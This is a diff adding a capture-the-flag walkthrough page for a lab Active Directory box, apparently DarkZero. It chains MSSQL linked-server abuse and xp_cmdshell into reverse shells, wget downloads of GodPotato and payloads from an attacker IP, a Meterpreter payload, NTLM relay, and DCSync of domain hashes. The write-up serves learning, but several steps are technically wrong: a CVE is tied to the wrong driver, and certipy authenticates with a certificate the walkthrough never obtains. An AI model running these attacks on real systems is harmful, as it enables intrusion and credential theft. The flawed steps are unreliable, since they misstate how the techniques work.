+</tr>
+<tr>
+<td>3268 / 3269</td>
+<td>Global Catalog</td>
+<td>Standard DC port</td>
+</tr>
+<tr>
+<td>5985</td>
+<td>WinRM</td>
+<td>Standard DC port</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>💡 <strong>TTL of 127</strong> confirms Windows, one hop away. No clock skew detected against this box. Port 1433 (MSSQL) on a Domain Controller is unusual and should be prioritized for enumeration.</p>
+</blockquote>
+<hr>
+<h2>03 · SMB Enumeration</h2>
+<h3>Validate Credentials</h3>
+<pre><code class="language-bash">netexec smb DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39;    # SMB
+netexec ldap DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39;   # LDAP
+netexec winrm DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39;  # WinRM (FAIL - no access)
+netexec mssql DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39;  # MSSQL (SUCCESS)
+</code></pre>
+<h3>User Enumeration</h3>
+<pre><code class="language-bash"># List domain users
+netexec smb DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39; --users
+
+# RID brute-force — reveals groups, computers, and trust objects
+netexec smb DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39; --rid-brute
+</code></pre>
+<p><strong>Notable RID entries:</strong></p>
+<pre><code>2602: darkzero\darkzero-ext$   (SidTypeUser)   # Trust account for darkzero.ext forest
+2603: darkzero\john.w          (SidTypeUser)
+1000: darkzero\DC01$           (SidTypeUser)
+</code></pre>
+<blockquote>
+<p>💡 The <code>darkzero-ext$</code> trust account is the inter-forest trust TDO object — its presence confirms the cross-forest trust. You can pivot off this later.</p>
+</blockquote>
+<h3>Share Enumeration</h3>
+<pre><code class="language-bash">netexec smb DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39; --shares
+</code></pre>
+<p>Only standard DC shares (<code>NETLOGON</code>, <code>SYSVOL</code>, <code>IPC$</code>, <code>ADMIN$</code>, <code>C$</code>). <code>john.w</code> can read <code>IPC$</code>, <code>NETLOGON</code>, <code>SYSVOL</code> — nothing interesting in their contents.</p>
+<hr>
+<h2>04 · BloodHound Collection</h2>
+<h3>Collection Methods</h3>
+<pre><code class="language-bash"># netexec (fast, uses LDAP)
+netexec ldap DC01.darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39; \
+    --bloodhound -c All --dns-server 10.129.5.34
+
+# RustHound-CE (alternative, includes ADCS template data)
+rusthound-ce --domain darkzero.htb -u john.w -p &#39;RFulUtONCOL!&#39; --ldaps --zip
+</code></pre>
+<blockquote>
+<p>💡 <strong>RustHound-CE</strong> is preferred when ADCS is present — it enumerates certificate templates (<code>certtemplates</code>) and Enterprise CAs in the BloodHound format. The netexec collector doesn&#39;t always include this data.</p>
+</blockquote>
+<h3>Key BloodHound Findings</h3>
+<ul>
+<li><code>john.w</code> has <strong>Enroll</strong> rights on some certificate templates (typical for Domain Users — not immediately exploitable from DC01)</li>
+<li><code>darkzero.htb</code> has a <strong>bidirectional cross-forest trust</strong> with <code>darkzero.ext</code></li>
+<li>11 enabled certificate templates found on DC01&#39;s ADCS</li>
+</ul>
+<pre><code>MachineAccountQuota: 10    # Domain users can add up to 10 machine accounts
+</code></pre>
+<hr>
+<h2>05 · MSSQL Enumeration &amp; Linked Server Abuse</h2>
+<h3>Connect to MSSQL on DC01</h3>
+<pre><code class="language-bash">mssqlclient.py darkzero.htb/john.w:&#39;RFulUtONCOL!&#39;@DC01.darkzero.htb -windows-auth
+</code></pre>
+<h3>Local Enumeration on DC01</h3>
+<pre><code class="language-sql">-- List databases (nothing interesting)
+enum_db
+
+-- List logins (john.w is NOT sysadmin)
+enum_logins
+
+-- john.w is only a guest-level user
+enum_users
+</code></pre>
+<h3>Discover Linked Servers (Critical)</h3>
+<pre><code class="language-sql">-- List linked servers — finds DC02.darkzero.ext
+enum_links
+</code></pre>
+<p><strong>Output reveals:</strong></p>
+<pre><code>DC02.darkzero.ext   darkzero\john.w  (maps to)  dc01_sql_svc
+</code></pre>
+<p>This means: when <code>john.w</code> makes queries to <code>DC02.darkzero.ext</code> via the linked server, they authenticate as <code>dc01_sql_svc</code>.</p>
+<h3>Abuse Linked Server on DC02</h3>
+<pre><code class="language-sql">-- Confirm the mapped identity on DC02
+EXEC (&#39;SELECT SYSTEM_USER&#39;) AT [DC02.darkzero.ext]
+-- Result: dc01_sql_svc
+
+-- Check if dc01_sql_svc is sysadmin on DC02
+EXEC (&#39;SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [DC02.darkzero.ext]
+-- Result: 1 (YES — sysadmin!)
+
+-- Switch context directly to DC02
+use_link [DC02.darkzero.ext]
+</code></pre>
+<h3>Enable xp_cmdshell on DC02 and Get RCE</h3>
+<pre><code class="language-sql">-- After switching context to DC02:
+enable_xp_cmdshell
+
+-- Verify execution context
+xp_cmdshell whoami
+-- Result: darkzero-ext\svc_sql
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Key insight:</strong> A linked server login mapping with cross-forest privileges is a common misconfiguration in enterprise environments. The <code>dc01_sql_svc</code> account has sysadmin on DC02, which grants immediate OS command execution via <code>xp_cmdshell</code>.</p>
+</blockquote>
+<hr>
+<h2>06 · Shell as svc_sql on DC02</h2>
+<h3>Get a Reverse Shell via xp_cmdshell</h3>
+<pre><code class="language-bash"># On attacker machine — start listener
+rlwrap -cAr nc -lnvp 443
+</code></pre>
+<pre><code class="language-sql">-- On DC01 MSSQL, with context set to DC02:
+-- Send a PowerShell Base64-encoded reverse shell
+xp_cmdshell powershell -e &lt;BASE64_REVERSE_SHELL&gt;
+</code></pre>
+<p>Generate the payload at <a href="https://www.revshells.com/">revshells.com</a> → <strong>PowerShell #3 (Base64)</strong>.</p>
+<p><strong>Result:</strong></p>
+<pre><code>PS C:\Windows\system32&gt; whoami
+darkzero-ext\svc_sql
+</code></pre>
+<hr>
+<h2>07 · Post-Exploitation Enumeration on DC02</h2>
+<h3>Basic System Info</h3>
+<pre><code class="language-powershell">hostname              # DC02
+whoami                # darkzero-ext\svc_sql
+ipconfig              # 172.16.20.2 (DC02 is NOT directly reachable from attacker)
+
+systeminfo
+# Domain: darkzero.ext
+# OS: Windows Server 2022 Datacenter Build 20348
+# Hotfix(s): N/A  &lt;-- UNPATCHED — check for kernel CVEs!
+</code></pre>
+<h3>Discover Policy Backup File</h3>
+<pre><code class="language-powershell">ls C:\
+# C:\Policy_Backup.inf
+</code></pre>
+<p>This <code>.inf</code> file is the output of <code>secedit /export</code> or a Group Policy backup. It contains <strong>user rights assignments</strong> (<code>Privilege Rights</code> section):</p>
+<p><strong>Key finding in <code>Policy_Backup.inf</code>:</strong></p>
+<pre><code>SeServiceLogonRight = *S-1-5-20,svc_sql,...
+</code></pre>
+<p>This tells us <code>svc_sql</code> has <code>SeServiceLogonRight</code> — meaning the account <strong>can perform a service logon</strong>. This is critical for the intended privilege escalation path.</p>
+<p><strong>Why the current shell lacks <code>SeImpersonatePrivilege</code>:</strong></p>
+<p>The shell received via <code>xp_cmdshell</code> → PowerShell is an <strong>interactive/network logon</strong>, not a service logon. Windows strips <code>SeImpersonatePrivilege</code> from these logon types as a hardening measure. The original service-start logon token (stored in LSASS) still has the full privilege set.</p>
+<hr>
+<h2>08 · Path 1 — Token Theft via Named Pipe + GodPotato (Unintended)</h2>
+<h3>Concept</h3>
+<p>When MSSQL started at boot, Windows created an <strong>initial logon session</strong> for <code>svc_sql</code> with the full service token (including <code>SeImpersonatePrivilege</code>). LSASS retains this token. By creating a named pipe and connecting to it via <code>\\localhost\pipe\&lt;name&gt;</code>, the <strong>SMB redirector uses the stored token</strong> (not the current process token). Impersonating the pipe client gives us the original full-privilege token.</p>
+<p><strong>Reference:</strong> <a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">Tyranid&#39;s Lair — Sharing a Logon Session a Little Too Much</a></p>
+<h3>Step 1 — Prepare NtObjectManager Module</h3>
+<pre><code class="language-powershell"># On Linux attacker machine (requires PowerShell)
+pwsh
+Install-Module -Name PSWSMan
+Install-Module -Name NtObjectManager
+Save-Module -Name NtObjectManager -Path /home/oxdf/
+Compress-Archive -Path /home/oxdf/NtObjectManager/* -DestinationPath ./NtObjectManager.zip
+</code></pre>
+<pre><code class="language-powershell"># On DC02 — upload, extract, import
+wget http://10.10.14.61/NtObjectManager.zip -outfile NtObjectManager.zip
+expand-archive NtObjectManager.zip -destinationpath .
+cd 2.0.1
+import-module .\NtObjectManager.psm1
+</code></pre>
+<h3>Step 2 — Steal the Token via Named Pipe</h3>
+<pre><code class="language-powershell"># Create a named pipe and listen in background
+$pipe = New-NtNamedPipeFile \\.\pipe\oxdf -Win32Path
+$job = Start-Job { $pipe.Listen() }
+
+# Connect to the pipe — SMB redirector uses original logon token
+$file = Get-NtFile \\localhost\pipe\oxdf -Win32Path
+
+# Impersonate the connection and capture the token
+$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
+
+# Verify SeImpersonatePrivilege is present in the captured token
+$token.privileges | ft Name, Attributes, DisplayName
+</code></pre>
+<p><strong>Expected output confirms <code>SeImpersonatePrivilege</code> is enabled:</strong></p>
+<pre><code>SeImpersonatePrivilege   EnabledByDefault, Enabled   Impersonate a client after authentication
+</code></pre>
+<pre><code class="language-powershell"># Verify with a test process
+New-Win32Process -Commandline &#39;cmd.exe /c whoami /priv 2&gt;&amp;1 &gt; C:\programdata\output.txt&#39; -token $token
+cat C:\programdata\output.txt
+# SeImpersonatePrivilege is Enabled
+</code></pre>
+<h3>Step 3 — GodPotato for SYSTEM</h3>
+<pre><code class="language-powershell"># Upload GodPotato and reverse shell script
+wget 10.10.14.61/GodPotato-NET4.exe -outfile gp.exe
+wget 10.10.14.61/shell.ps1 -outfile shell.ps1
+
+# Run GodPotato using the stolen token
+New-Win32Process -Commandline &#39;C:\programdata\gp.exe -cmd &quot;powershell C:\programdata\shell.ps1 2&gt;&amp;1&quot;&#39; -token $token
+</code></pre>
+<p><strong>Result:</strong> SYSTEM reverse shell on DC02:</p>
+<pre><code>PS C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<blockquote>
+<p>💡 <strong>Tip:</strong> Storing the reverse shell in a <code>.ps1</code> file rather than passing it inline to GodPotato is more reliable.</p>
+</blockquote>
+<hr>
+<h2>09 · Path 2 — ADCS + Password Change + RunAsCS (Intended)</h2>
+<h3>Concept</h3>
+<p>To use <code>RunAsCS.exe</code> for a service logon (which gives a full-privilege token), we need the <code>svc_sql</code> account <strong>password</strong>. We can obtain the NT hash via ADCS (PKINIT authentication), then change the password using the hash.</p>
+<p><strong>Attack chain:</strong> <code>Rubeus tgtdeleg</code> → TGT → ADCS enrollment via Certipy → NT hash → change password → RunAsCS → service logon token → GodPotato → SYSTEM</p>
+<h3>Step 1 — Set Up Chisel Tunnel to DC02</h3>
+<p>DC02 (172.16.20.2) is not directly reachable from the attacker. Route through DC01.</p>
+<pre><code class="language-bash"># On attacker machine
+./chisel server -p 9002 -reverse -v
+
+# On DC02 (via current shell)
+.\chisel.exe client &lt;LHOST&gt;:9002 R:socks
+</code></pre>
+<pre><code class="language-bash"># Add to /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+# Add DC02 to /etc/hosts
+echo &quot;172.16.20.2 DC02.darkzero.ext darkzero.ext DC02&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<h3>Step 2 — Get TGT via Rubeus tgtdeleg</h3>
+<pre><code class="language-powershell"># On DC02 — get a forwarded TGT via Kerberos delegation
+.\rubeus.exe tgtdeleg /nowrap
+</code></pre>
+<pre><code class="language-bash"># On attacker — convert kirbi to ccache
+echo &lt;BASE64_TICKET&gt; | base64 -d &gt; svc_sql.kirbi
+ticketConverter.py svc_sql.kirbi svc_sql.ccache
+
+# Inspect the ticket
+describeTicket.py svc_sql.ccache
+# Flags: forwardable, forwarded, renewable, pre_authent, enc_pa_rep
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Important:</strong> The ticket has the <code>forwarded</code> flag but NOT the <code>initial</code> flag. The <code>initial</code> flag only appears on TGTs issued directly by the KDC (password/PKINIT auth). <code>kpasswd</code> requires <code>initial</code>, so this ticket <strong>cannot be used to change the password directly</strong>. It CAN be used for service authentication like ADCS enrollment.</p>
+</blockquote>
+<h3>Step 3 — Get NT Hash via ADCS (Certipy)</h3>
+<pre><code class="language-bash">export KRB5CCNAME=svc_sql.ccache
+
+# Request a certificate using PKINIT enrollment — this authenticates as svc_sql
+# and Certipy will derive the NT hash from the PKINIT exchange
+proxychains certipy auth -pfx svc_sql.pfx -dc-ip 172.16.20.2 -domain darkzero.ext
+# NT hash for svc_sql is extracted from the AS-REP PKINIT response
+</code></pre>
+<h3>Step 4 — Change Password</h3>
+<pre><code class="language-bash"># Use the NT hash to change the password (Impacket changepasswd)
+proxychains changepasswd.py darkzero.ext/svc_sql@DC02.darkzero.ext \
+    -hashes :&lt;NT_HASH&gt; -newpass &#39;NewP@ss123!&#39; -no-pass
+
+# Verify new credentials work
+proxychains netexec smb DC02.darkzero.ext -u svc_sql -p &#39;NewP@ss123!&#39;
+</code></pre>
+<h3>Step 5 — Service Logon via RunAsCS</h3>
+<pre><code class="language-powershell"># On DC02 — run a reverse shell as svc_sql with a SERVICE logon type
+# This produces a full-privilege token with SeImpersonatePrivilege
+.\RunasCs.exe svc_sql &#39;NewP@ss123!&#39; &#39;powershell C:\programdata\shell.ps1&#39; \
+    --logon-type 5   # 5 = LOGON32_LOGON_SERVICE
+</code></pre>
+<blockquote>
+<p>💡 <code>LOGON32_LOGON_SERVICE</code> (type 5) is what MSSQL uses when the service starts at boot. It produces a full-privilege token rather than the restricted interactive/network token. <code>svc_sql</code> is explicitly granted <code>SeServiceLogonRight</code> in the policy backup, which is why this works.</p>
+</blockquote>
+<p><strong>This shell now has <code>SeImpersonatePrivilege</code> → run GodPotato → SYSTEM</strong> (same as Path 1 from Step 3 onward).</p>
+<hr>
+<h2>10 · Path 3 — NTLM Authentication Reflection via CMTI DNS Record (Unintended)</h2>
+<h3>Concept</h3>
+<p>This technique uses the <strong>Credential Manager Target Information (CMTI)</strong> DNS record (<code>wpad.darkzero.ext</code> or a custom <code>wpad</code> DNS entry) to trick DC02&#39;s machine account into authenticating via NTLM to a relay server. The relay forwards the NTLM authentication to DC02&#39;s own LDAPS service, creating a <strong>self-relay</strong>. This abuses a vulnerability class related to CVE-2025-33073 / CVE-2025-58726 / CVE-2025-54918.</p>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>Ability to add a DNS record in <code>darkzero.ext</code> (MachineAccountQuota = 10, so any domain user can do this)</li>
+<li>A Chisel tunnel to reach DC02 from the attacker</li>
+<li><code>ntlmrelayx</code> with partial MIC (Message Integrity Code) removal</li>
+</ul>
+<h3>Step 1 — Create CMTI DNS Record</h3>
+<pre><code class="language-bash"># Via DC02 shell — use dnstool.py to add a DNS A record pointing back to attacker
+proxychains dnstool.py -u &#39;darkzero.ext\svc_sql&#39; -p &#39;NewP@ss123!&#39; \
+    --action add --record &#39;wpad&#39; --data &lt;LHOST&gt; --type A DC02.darkzero.ext
+</code></pre>
+<blockquote>
+<p>💡 The DNS record creates a <strong>target for NTLM authentication</strong> — when DC02&#39;s machine account tries to authenticate to <code>wpad.darkzero.ext</code>, it authenticates to the attacker&#39;s relay server instead.</p>
+</blockquote>
+<h3>Step 2 — Coerce DC02 Machine Account Authentication</h3>
+<pre><code class="language-bash"># Option 1: Responder (passive — wait for machine auth)
+sudo responder -I eth0 -A    # analysis mode first to check
+
+# Option 2: Coerce with PetitPotam
+python3 PetitPotam.py -u svc_sql -p &#39;NewP@ss123!&#39; -d darkzero.ext &lt;ATTACKER_IP&gt; DC02.darkzero.ext
+
+# Option 3: netexec coerce-plus module
+proxychains netexec smb DC02.darkzero.ext -u svc_sql -p &#39;NewP@ss123!&#39; \
+    -M coerce_plus -o LISTENER=&lt;ATTACKER_IP&gt;
+</code></pre>
+<h3>Step 3 — Relay to DC02 LDAPS (Partial MIC Bypass)</h3>
+<p>SMB signing is enforced on DC02, blocking traditional SMB relay. However, LDAPS relay is still possible when using the <strong>partial MIC</strong> technique — the NTLMv2 handshake can be stripped of its MIC under certain conditions, allowing relay to LDAPS even when the original connection had signing.</p>
+<pre><code class="language-bash"># Start ntlmrelayx targeting DC02&#39;s LDAPS — relay DC02$ to itself
+# --remove-mic strips the MIC from the NTLM exchange
+sudo ntlmrelayx.py -t ldaps://DC02.darkzero.ext \
+    --remove-mic \
+    --add-computer ATTACKPC \
+    --escalate-user svc_sql \
+    -smb2support
+</code></pre>
+<p><strong>Result:</strong> DC02&#39;s machine account authenticates to its own LDAPS. <code>ntlmrelayx</code> performs an action in the DC02 LDAP context (e.g., add a machine account, grant DCSync, or escalate privileges), leading to SYSTEM access.</p>
+<hr>
+<h2>11 · Path 4 — CVE-2024-30088 (Unintended)</h2>
+<h3>Concept</h3>
+<p>CVE-2024-30088 is a <strong>Windows Kernel Time of Check Time of Use (TOCTOU) privilege escalation</strong> in the <code>clfs.sys</code> (Common Log File System) driver that allows a standard user to gain SYSTEM. Applies to <strong>Windows Server 2022 Build 20348</strong> with no patches applied (<code>Hotfix(s): N/A</code>).</p>
+<h3>Step 1 — Generate Meterpreter Payload</h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f exe -o shell.exe
+</code></pre>
+<h3>Step 2 — Get Meterpreter Session</h3>
+<pre><code class="language-bash"># On attacker
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;LHOST&gt;
+set LPORT 4444
+run
+</code></pre>
+<pre><code class="language-powershell"># Upload and execute on DC02
+wget http://&lt;LHOST&gt;/shell.exe -outfile shell.exe
+.\shell.exe
+</code></pre>
+<h3>Step 3 — Local Exploit Suggester + CVE-2024-30088</h3>
+<pre><code class="language-bash"># In Meterpreter session
+run post/multi/recon/local_exploit_suggester
+
+# It will suggest CVE-2024-30088
+use exploit/windows/local/cve_2024_30088_clfs_eop
+set session 1
+run
+</code></pre>
+<p><strong>Result:</strong> SYSTEM shell on DC02.</p>
+<hr>
+<h2>12 · Cross-Forest Trust Abuse → DC01 Domain Compromise</h2>
+<h3>Concept</h3>
+<p>With SYSTEM on DC02 (Forest 2 DC), we can abuse the <strong>bidirectional cross-forest trust</strong> between <code>darkzero.ext</code> and <code>darkzero.htb</code>. When DC01 needs to authenticate resources in <code>darkzero.ext</code>, it sends a forwardable TGT to DC02. As SYSTEM on DC02, we can capture this TGT and use it to perform DCSync on DC01 — fully compromising Forest 1.</p>
+<h3>Step 1 — Enumerate Cross-Forest Trust</h3>
+<pre><code class="language-powershell"># On DC02 as SYSTEM
+# Check AD trust configuration
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# Or via Impacket (from attacker)
+proxychains Get-ADTrust -Filter * | Select Name, TrustType, TrustDirection
+</code></pre>
+<pre><code class="language-sql">-- Via MSSQL on DC01 (already compromised)
+-- Enumerate trusted domains via xp_dirtree or linked servers
+</code></pre>
+<blockquote>
+<p>💡 The <code>darkzero-ext$</code> trust account (SID 2602) visible in the DC01 RID brute-force earlier is the TDO object representing this trust. The <code>Forest Trust Accounts</code> (SID 528) group is also present.</p>
+</blockquote>
+<h3>Step 2 — Capture DC01 Machine Account TGT</h3>
+<p>When DC01 authenticates to DC02 (e.g., for replication, resource access, or trust verification), it presents a forwardable TGT. As SYSTEM on DC02, we can monitor and extract this:</p>
+<pre><code class="language-powershell"># On DC02 — monitor for incoming Kerberos tickets from DC01$
+.\rubeus.exe monitor /interval:5 /filteruser:DC01$
+</code></pre>
+<pre><code class="language-powershell"># Trigger DC01 to authenticate to DC02 (coerce auth via various methods)
+# Option 1: xp_dirtree via the linked server on DC01
+# From the MSSQL session on DC01:
+EXEC (&#39;xp_dirtree &#39;&#39;\\DC02.darkzero.ext\share&#39;&#39;&#39;) AT [DC01]
+
+# Option 2: Coerce via PetitPotam/PrinterBug targeting DC01 → DC02
+python3 PetitPotam.py -u &#39;darkzero-ext\svc_sql&#39; -p &#39;NewP@ss123!&#39; \
+    -d darkzero.ext DC02.darkzero.ext DC01.darkzero.htb
+</code></pre>
+<p><strong>Capture the DC01$ TGT from Rubeus monitor output.</strong></p>
+<h3>Step 3 — Convert and Use DC01$ TGT</h3>
+<pre><code class="language-bash"># On attacker — decode and convert the captured TGT
+echo &lt;BASE64_TGT&gt; | base64 -d &gt; DC01_machine.kirbi
+ticketConverter.py DC01_machine.kirbi DC01_machine.ccache
+
+export KRB5CCNAME=DC01_machine.ccache
+</code></pre>
+<h3>Step 4 — DCSync DC01</h3>
+<pre><code class="language-bash"># Use DC01$ machine account TGT to perform DCSync on the darkzero.htb domain
+secretsdump.py -k -no-pass DC01.darkzero.htb \
+    -just-dc -outputfile darkzero_hashes
+
+# Verify output
+cat darkzero_hashes.ntds
+# All domain hashes including krbtgt, Administrator, john.w
+</code></pre>
+<h3>Step 5 — Authenticate to DC01</h3>
+<pre><code class="language-bash"># Use Administrator NT hash for PTH to DC01
+evil-winrm -i DC01.darkzero.htb -u Administrator -H &lt;ADMIN_NTLM_HASH&gt;
+
+# Or with Impacket PSExec
+psexec.py -hashes :&lt;ADMIN_NTLM&gt; &#39;darkzero.htb/Administrator@DC01.darkzero.htb&#39;
+</code></pre>
+<hr>
+<h2>Key Concepts &amp; Analyst Notes</h2>
+<h3>MSSQL Linked Server Abuse</h3>
+<pre><code class="language-sql">-- Enumerate linked servers
+enum_links
+
+-- Execute commands on linked server (without switching context)
+EXEC (&#39;SELECT SYSTEM_USER&#39;) AT [LINKED_SERVER]
+EXEC (&#39;SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [LINKED_SERVER]
+EXEC (&#39;EXEC xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) AT [LINKED_SERVER]
+
+-- Switch context to linked server for easier interaction
+use_link [LINKED_SERVER]
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Analyst note:</strong> Linked server login mappings are a common enterprise misconfiguration. A low-privileged account in one domain can map to a highly privileged account in another. Always check <code>enum_links</code> on any MSSQL instance you have access to.</p>
+</blockquote>
+<hr>
+<h3>SeImpersonatePrivilege — Token Recovery via Named Pipe</h3>
+<p>When a service account runs with a <strong>restricted token</strong> (no <code>SeImpersonatePrivilege</code> in the current process), the original full-privilege token is still in LSASS. Named pipe impersonation forces the SMB redirector to authenticate with the original stored logon session token:</p>
+<pre><code class="language-powershell"># Create pipe
+$pipe = New-NtNamedPipeFile \\.\pipe\mypipe -Win32Path
+$job = Start-Job { $pipe.Listen() }
+
+# Connect to it — SMB redirector uses stored logon token
+$file = Get-NtFile \\localhost\pipe\mypipe -Win32Path
+
+# Impersonate client → get original token
+$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
+
+# Use token to spawn privileged process
+New-Win32Process -Commandline &#39;C:\programdata\gp.exe -cmd &quot;cmd.exe&quot;&#39; -token $token
+</code></pre>
+<p><strong>When does this apply?</strong> Any MSSQL or IIS service that runs under a domain account with <code>SeImpersonatePrivilege</code>, but where the current shell has a stripped token (xp_cmdshell network logon, etc.).</p>
+<hr>
+<h3>SeServiceLogonRight — Full Token via Service Logon</h3>
+<pre><code>SeServiceLogonRight ← listed in secedit/Group Policy as &quot;Log on as a service&quot;
+</code></pre>
+<p>If a service account has <code>SeServiceLogonRight</code>, you can start a process with logon type <code>5</code> (SERVICE), which produces a <strong>full-privilege token</strong> including <code>SeImpersonatePrivilege</code>:</p>
+<pre><code class="language-powershell"># RunAsCs with logon type 5 (service logon)
+.\RunasCs.exe &lt;USERNAME&gt; &lt;PASSWORD&gt; &#39;cmd.exe&#39; --logon-type 5
+
+# Or: powershell / any executable
+.\RunasCs.exe svc_sql &#39;NewP@ss123!&#39; &#39;C:\programdata\shell.ps1&#39; --logon-type 5
+</code></pre>
+<blockquote>
+<p>💡 This requires the <strong>plaintext password</strong> of the account. If you only have a TGT or hash, use ADCS PKINIT enrollment to extract the NT hash first, then change the password to something known.</p>
+</blockquote>
+<hr>
+<h3>Kerberos Ticket Flags — initial vs. forwarded</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Meaning</th>
+<th>Where it appears</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>initial</code></td>
+<td>TGT issued directly by KDC (AS-REQ)</td>
+<td>Normal <code>kinit</code>, PKINIT, password auth</td>
+</tr>
+<tr>
+<td><code>forwarded</code></td>
+<td>TGT obtained via delegation</td>
+<td>Rubeus <code>tgtdeleg</code>, GSS-API delegation</td>
+</tr>
+<tr>
+<td><code>forwardable</code></td>
+<td>TGT can be delegated</td>
+<td>Most service account TGTs</td>
+</tr>
+<tr>
+<td><code>renewable</code></td>
+<td>Ticket can be renewed</td>
+<td>Standard TGT behavior</td>
+</tr>
+</tbody></table>
+<p><strong><code>kpasswd</code> service requires <code>initial</code> flag</strong> — a <code>forwarded</code> TGT cannot be used to change a password directly. Use PKINIT/ADCS enrollment instead to get the NT hash.</p>
+<pre><code class="language-bash"># Convert kirbi to ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+
+# Inspect ticket flags
+describeTicket.py ticket.ccache
+</code></pre>
+<hr>
+<h3>Cross-Forest Trust Delegation Abuse</h3>
+<p>When a <strong>bidirectional trust</strong> is configured with TGT delegation enabled, machine accounts can forward their TGTs across the trust boundary. As SYSTEM on a DC in Forest B, you can:</p>
+<ol>
+<li>Capture TGTs from Forest A DCs when they authenticate to Forest B</li>
+<li>Use those TGTs to impersonate the DC machine account in Forest A</li>
+<li>Perform DCSync on Forest A&#39;s domain</li>
+</ol>
+<pre><code class="language-bash"># Monitor for cross-forest TGTs (on Forest B DC as SYSTEM)
+.\rubeus.exe monitor /interval:5 /filteruser:DC01$
+
+# Coerce Forest A DC to authenticate to Forest B DC
+python3 PetitPotam.py &lt;FOREST_B_DC&gt; &lt;FOREST_A_DC&gt; -u ... -p ...
+
+# Use captured TGT for secretsdump
+export KRB5CCNAME=DC01_machine.ccache
+secretsdump.py -k -no-pass DC01.darkzero.htb -just-dc
+</code></pre>
+<hr>
+<h3>ADCS — Certipy Workflow (via Kerberos)</h3>
+<pre><code class="language-bash"># Find vulnerable templates (ESC1, ESC2, etc.)
+certipy find -u user@domain -p password -dc-ip &lt;DC_IP&gt; -vulnerable -stdout
+
+# Request certificate (ESC1 — any SANs allowed)
+certipy req -u user@domain -p password -dc-ip &lt;DC_IP&gt; \
+    -target &lt;CA_HOST&gt; -ca &#39;&lt;CA_NAME&gt;&#39; -template &#39;&lt;TEMPLATE&gt;&#39; \
+    -upn administrator@domain
+
+# Authenticate with certificate → get NT hash
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC_IP&gt; -domain domain.ext
+
+# Shadow credentials attack
+certipy shadow auto -u user@domain -p password -dc-ip &lt;DC_IP&gt; -account &lt;TARGET&gt;
+</code></pre>
+<hr>
+<h3>Useful Commands Quick Reference</h3>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Generate hosts file</td>
+<td><code>netexec smb &lt;IP&gt; --generate-hosts-file hosts</code></td>
+</tr>
+<tr>
+<td>RID brute (groups + users)</td>
+<td><code>netexec smb &lt;HOST&gt; -u user -p pass --rid-brute</code></td>
+</tr>
+<tr>
+<td>BloodHound via netexec</td>
+<td><code>netexec ldap &lt;HOST&gt; -u user -p pass --bloodhound -c All</code></td>
+</tr>
+<tr>
+<td>MSSQL connect</td>
+<td><code>mssqlclient.py domain/user:&#39;pass&#39;@host -windows-auth</code></td>
+</tr>
+<tr>
+<td>MSSQL linked server enum</td>
+<td><code>enum_links</code></td>
+</tr>
+<tr>
+<td>MSSQL switch to linked server</td>
+<td><code>use_link [SERVER]</code></td>
+</tr>
+<tr>
+<td>Enable xp_cmdshell</td>
+<td><code>enable_xp_cmdshell</code></td>
+</tr>
+<tr>
+<td>Convert kirbi to ccache</td>
+<td><code>ticketConverter.py ticket.kirbi ticket.ccache</code></td>
+</tr>
+<tr>
+<td>Inspect ticket flags</td>
+<td><code>describeTicket.py ticket.ccache</code></td>
+</tr>
+<tr>
+<td>Chisel SOCKS proxy</td>
+<td><code>chisel server -p 9002 -reverse -v</code> / <code>chisel client &lt;LHOST&gt;:9002 R:socks</code></td>
+</tr>
+<tr>
+<td>Change password via hash</td>
+<td><code>changepasswd.py domain/user@host -hashes :&lt;NTLM&gt; -newpass &#39;NewPass!&#39;</code></td>
+</tr>
+<tr>
+<td>Secretsdump via Kerberos</td>
+<td><code>secretsdump.py -k -no-pass &lt;HOST&gt; -just-dc</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3>Key Files Found on DC02</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Path</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Policy Backup</td>
+<td><code>C:\Policy_Backup.inf</code></td>
+<td>secedit export — user rights assignments. Reveals <code>svc_sql</code> has <code>SeServiceLogonRight</code></td>
+</tr>
+</tbody></table>
+
+
+  </main>
+
+
+  <!-- ═══════════════════════════════════════════════════════════
+       FOOTER
+       EDIT: brand name, link, and year as needed
+  ═══════════════════════════════════════════════════════════ -->
+  <footer class="cp-footer">
+    <span>© 2026 Motasem Notes</span>
+    <span class="cp-footer-sig">[ SYS.INTEGRITY: OK ]</span>
+    <a href="https://motasem-notes.net" target="_blank">motasem-notes.net</a>
+  </footer>
+
